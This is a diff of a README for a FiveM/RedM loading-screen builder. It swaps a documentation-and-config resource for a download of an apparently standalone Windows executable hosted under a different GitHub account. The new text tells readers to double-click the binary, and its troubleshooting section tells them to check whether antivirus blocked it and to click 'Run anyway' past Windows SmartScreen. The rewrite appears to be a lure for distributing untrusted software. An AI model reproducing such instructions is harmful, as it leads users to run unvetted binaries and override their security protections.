@@ -1,117 +1,58 @@
-# FiveM Loading Screen Docs v1.1.0 – Game Server Resource 2026
+# 🛠️ fivem-loading-screen-v110 - Create custom game loading screens easily
 
-A complete documentation and configuration toolkit for creating custom loading screens on FiveM servers. Supports ESX, QBCore, QBX, and RedM frameworks, and includes an AI-powered build assistant plus a live preview system.
+[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/Inductive-scythia854/fivem-loading-screen-v110)
 
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/davisvictor20/fivem-loading-screen-v110?style=flat-square)](https://github.com/davisvictor20/fivem-loading-screen-v110)
+This tool helps developers build interactive loading screens for FiveM and RedM servers. You do not need to write code to create professional screens. The software provides a visual interface to drag and drop elements, view changes in real time, and connect to common server frameworks.
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://davisvictor20.github.io/fivem-loading-screen-v110/">
-    <img src="https://img.shields.io/badge/Download-FiveM%20Loading%20Screen%20Docs%20Latest-brightgreen?style=for-the-badge" alt="Download FiveM Loading Screen Docs">
-  </a>
-</p>
+The application works on Windows 10 and Windows 11. You need at least 200MB of free disk space. Ensure you have the latest version of the .NET Desktop Runtime installed on your computer before you start. The software functions as a standalone builder, so it does not interfere with your existing server files until you export your final project.
 
-> **[Direct Download – FiveM Loading Screen Docs v1.1.0](https://davisvictor20.github.io/fivem-loading-screen-v110/)**
+## 📥 Installation
 
----
+1. Visit the [official download page](https://github.com/Inductive-scythia854/fivem-loading-screen-v110).
+2. Click the green button labeled "Code" and select "Download ZIP" if you prefer source files, or look for the latest release link on the main page.
+3. Save the file to your computer.
+4. Extract the contents of the ZIP folder to a local directory on your drive.
+5. Open the folder and double-click the application icon to launch the builder.
 
-[Download Latest Build](https://davisvictor20.github.io/fivem-loading-screen-v110/)
+## ⚙️ How to use the builder
 
----
+The interface uses a workspace model. You select a template from the library on the left side of the screen. Once you select a template, the center panel displays a live preview. You can update text, add images, and change colors using the toolbars on the right side. 
 
-## Overview
+The AI assistant lives in the bottom corner of the window. You type requests into this box, such as "Change the background color to dark blue" or "Add a server rules list." The system applies these changes to the preview window automatically.
 
-This resource gives server admins and developers a turnkey solution for building and deploying professional loading screens on FiveM. Whether your server runs ESX, QBCore, QBX, or RedM, the included documentation and tools let you craft visually rich NUI-based loading experiences without deep front-end knowledge.
+## 🔗 Connecting to your server
 
-The project bundles a config builder, an AI build assistant, and a live preview to simplify the entire development pipeline. Community contributions and shared knowledge help tailor loading screens to any server theme—from hardcore roleplay on GTA5 to western settings on RedM. The docs cover everything from basic HTML structure to advanced customization with OX framework integration.
+When you finish your design, click the "Export" button in the top menu. The software creates a consolidated folder containing all the necessary HTML, CSS, and script files. Move this folder into your FiveM or RedM server's "resources" directory. Add the name of the folder to your server configuration file, usually named `server.cfg`, to ensure the game loads your new screen when players join.
 
-## Capabilities
+## 🖼️ Included features
 
-- **Config Builder** – An interactive tool that generates loading screen configurations without manual code editing.
-- **AI Build Assistant** – Provides intelligent suggestions and auto-generates code for custom loading screen components.
-- **Live Preview** – See changes in real time before pushing them to your server.
-- **Multi-Framework Support** – Works with ESX, QBCore, QBX, and RedM ecosystems.
-- **NUI Integration** – Full support for FiveM’s NUI system for smooth client-side rendering.
-- **Comprehensive Documentation** – Step-by-step guides for installation, customization, and troubleshooting.
-- **Community Templates** – Shared designs and configs contributed by the user community.
-- **Cross-Platform Ready** – Compatible with both GTA5 and RedM FiveM implementations.
+- Live Preview: See the exact look of your screen while you edit.
+- Multi-Framework Harmony: Compatible with ESX, QBCore, and standalone setups.
+- Community Templates: Access a library of pre-built designs.
+- AI Builder: Use simple text prompts to modify layout elements.
+- Resource Optimization: Files compress automatically to ensure fast loading times for players.
 
-## Installation
+## 🔍 Troubleshooting common issues
 
-Clone the repository to your local machine or directly into your FiveM server’s resources directory:
+If the application fails to open, check that your antivirus software did not block the file. Sometimes Windows SmartScreen protects unknown applications during their first launch. If you see this warning, click "More info" and then "Run anyway." 
 
-```bash
-git clone https://github.com/davisvictor20/fivem-loading-screen-v110.git fivem-loading-screen-docs
-```
+If the loading screen does not appear in your game, verify the folder name in your `server.cfg` file. Ensure the name matches the folder inside your resources directory exactly. The system is case-sensitive, so "loading-screen" and "Loading-Screen" are different names to the server.
 
-For first-time setup, navigate into the project folder and launch the documentation interface:
+If your images do not appear, place them in the correct asset subfolder inside your export. The builder handles most links automatically, but manual additions require you to keep the file structure intact. Point your asset paths to the local directory where you store your media files to ensure the browser inside the game can find them.
 
-```bash
-cd fivem-loading-screen-docs
-# Open index.html in your browser or serve via a local HTTP server
-```
+## 💾 System requirements
 
-Add the resource to your server.cfg:
+- Operating System: Windows 10 (64-bit) or Windows 11.
+- Processor: Dual-core 2.0 GHz or better.
+- Memory: 4 GB RAM.
+- Graphics: Integrated or dedicated GPU capable of rendering web content.
+- Storage: 200MB available disk space.
+- Software: .NET Desktop Runtime 6.0 or higher.
 
-```
-ensure fivem-loading-screen-docs
-```
+## 🌐 Community and support
 
-## Usage
+The project grows through feedback from users. If you find a bug, open an issue on the repository tracking page. Include screenshots of the error and a brief description of the steps you took before the error occurred. The community templates section updates every month with fresh designs. You can import your own templates to share with others or keep them private on your local machine.
 
-Once installed, access the documentation and config builder through your browser at the local server address. The typical workflow is:
-
-1. Open the config builder interface and choose your framework (ESX, QBCore, QBX, or RedM).
-2. Customize loading screen elements using the visual editor or the AI assistant.
-3. Preview changes in real time before exporting the final configuration.
-4. Copy the generated code into your server’s loading screen resource.
-
-For advanced users, directly edit the HTML, CSS, and JavaScript files in the `nui` folder to create fully bespoke loading screen experiences.
-
-## Configuration
-
-Loading screen settings are stored in `config.lua` inside the resource folder. Key options include:
-
-```lua
-Config = {
-    Framework = 'qbcore',  -- Options: 'esx', 'qbcore', 'qbx', 'redm'
-    Theme = 'default',
-    BackgroundType = 'image',  -- 'image', 'video', 'color'
-    ShowServerInfo = true,
-    LoadingBarStyle = 'progress',
-    MusicEnabled = false
-}
-```
-
-For framework-specific settings, refer to the documentation files in the `docs` directory corresponding to your chosen framework.
-
-## Requirements
-
-- FiveM server (GTA5 or RedM)
-- Supported framework: ESX, QBCore, QBX, or RedM
-- A modern web browser to access the documentation and config builder
-- Basic familiarity with FiveM resource structure
-- NUI support enabled on your server
-
-## FAQ
-
-**How do I update to the latest version?**  
-Pull the latest changes from the repository with `git pull`, or download the newest release from the link above. Always back up your custom configurations before updating.
-
-**Can I use this with custom frameworks?**  
-The docs primarily cover ESX, QBCore, QBX, and RedM, but the underlying NUI system works with any FiveM framework. You may need to adapt configuration files for unsupported frameworks.
-
-**Where can I find community templates?**  
-Visit the community section inside the documentation interface, or check the `templates` folder in the repository for shared loading screen designs.
-
-**My loading screen isn’t displaying correctly.**  
-Verify your server.cfg includes the resource, check the browser console for JavaScript errors, and ensure your framework configuration matches your server setup. Refer to the troubleshooting guide in the documentation.
-
-## License
-
-GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
+Keywords: fivem, redm, loading, screen, builder, server, gaming, automation, tools
